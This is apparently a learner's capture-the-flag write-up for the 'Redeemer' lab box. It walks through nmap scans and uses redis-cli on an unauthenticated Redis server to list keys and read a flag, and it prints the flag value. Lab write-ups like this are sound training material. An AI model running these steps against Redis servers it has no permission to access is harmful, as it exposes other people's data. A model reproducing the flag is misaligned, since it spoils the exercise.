---

---

# REDEEMER
---
## Getting Started
---
Use command to set Target IP
```bash
IP=10.129.90.78 ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```
---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 09:33 EDT
Nmap scan report for 10.129.90.78
Host is up (0.072s latency).
All 1000 scanned ports on 10.129.90.78 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds

```

**Notes**
Nothing on the first thousand ports


Nmap Command Ran
```bash
nmap -sV  -p-  $IP | copy
```

Results
```bash
NEVER FINISHED
```

**Notes**
I dont know why it never finished. I ended up looking at the walk-through and used the `-p` to go scan the port that i need for the box.

Nmap Command Ran
```bash
nmap -sV  -p 6379 $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:15 EDT
Nmap scan report for 10.129.90.78
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds

```

**Finding**
[Redis](obsidian://open?vault=OSCP&file=SERVICES%2FRedis%20Server%2FInfo) is running on port 6379.

---
### Redis Server Enumeration
---
Connect to  redis server.

Command
```bash
redis-cli -h $IP
```

Result
```bash
returns promp

10.129.90.78:6379>
```

Run basic Redis enumeration commands  `info` which returns information and statistics about the Redis server.
Command
```bash
info
```

Result
```bash
Retured alot of information but this is the most important for now

10.129.90.78:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924

```

**Finding**
The **keyspace** section provides statistics on the main dictionary of each database. The statistics include the number of keys, and the number of keys with an expiration.
In our case, under the `Keyspace` section, we can see that only one database exists with `index 0` .

Select this Redis logical database by using the `select` command followed by the index number of the database that needs to be selected .

Command
```bash
select 0
```

Result
```bash
ok
```

Look for all keys present

Command
```bash
keys *
```

Result
```bash
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

**Finding**
Seems to be a key labeled flag.

Retrieve the key with the `get` command
Command
```bash
get flag
```

Result
```bash
"03e1d2b376c37ab3f5319922053953eb"
```



---
## Flags
flag key
```bash
03e1d2b376c37ab3f5319922053953eb
```

---
## Tags
---
#redis #redis-cli 
